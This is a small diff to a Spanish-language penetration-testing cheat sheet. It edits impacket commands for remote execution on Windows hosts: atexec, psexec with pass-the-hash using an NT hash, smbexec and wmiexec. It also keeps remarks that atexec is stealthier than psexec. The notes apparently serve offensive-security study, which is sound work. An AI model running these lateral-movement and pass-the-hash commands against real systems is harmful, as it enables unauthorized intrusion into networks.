@@ -514,7 +514,7 @@ Jerarquía de preferencia para ejecución remota:
 ```
 
 ```bash 
-❯ impacket-atexec domain/user:pass@<IP> 'whoami' 
+❯ impacket-atexec domain/user:'pass'@<IP> "whoami"
 # Ejecución vía Task Scheduler — más sigiloso que psexec 
 
 ❯ impacket-psexec -port 445 domain/user@<IP> -hashes :NThash 
@@ -551,6 +551,7 @@ Jerarquía de preferencia para ejecución remota:
 # Requiere admin local
 
 ❯ impacket-smbexec user:pass@<IP>
+	❯ dir C:\Users     # No te deja usar el comando 'cd'
 # Alternativa cuando psexec falla
 
 ❯ impacket-wmiexec user:pass@<IP>
